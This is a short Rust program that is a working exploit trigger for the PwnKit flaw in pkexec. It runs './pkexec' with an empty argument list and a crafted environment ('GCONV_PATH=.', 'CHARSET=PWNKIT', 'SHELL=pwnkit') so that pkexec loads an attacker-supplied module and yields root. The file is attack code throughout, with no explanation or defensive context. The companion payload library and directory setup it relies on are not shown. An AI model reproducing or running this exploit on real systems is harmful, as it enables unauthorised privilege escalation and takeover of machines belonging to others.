use std::ffi::CString;
use std::ptr;

fn main() {
    // int execve(const char *pathname, char *const argv[], char *const envp[]);
    extern "C" {
        fn execve(pathname: *const i8, argv: *const *const i8, env: *const *const i8);
    }

    let exec_target = CString::new("./pkexec").unwrap();
    let evil_envp = vec![
        CString::new("pwnkit").unwrap(),
        CString::new("PATH=GCONV_PATH=.").unwrap(),
        CString::new("CHARSET=PWNKIT").unwrap(),
        CString::new("SHELL=pwnkit").unwrap(),
    ];

    unsafe {
        let mut evil_envp_raw = vec![];
        evil_envp.iter().for_each(|s| {
            evil_envp_raw.push(s.as_ptr());
        });
        execve(exec_target.as_ptr(), ptr::null(), evil_envp_raw.as_ptr());
    }
}
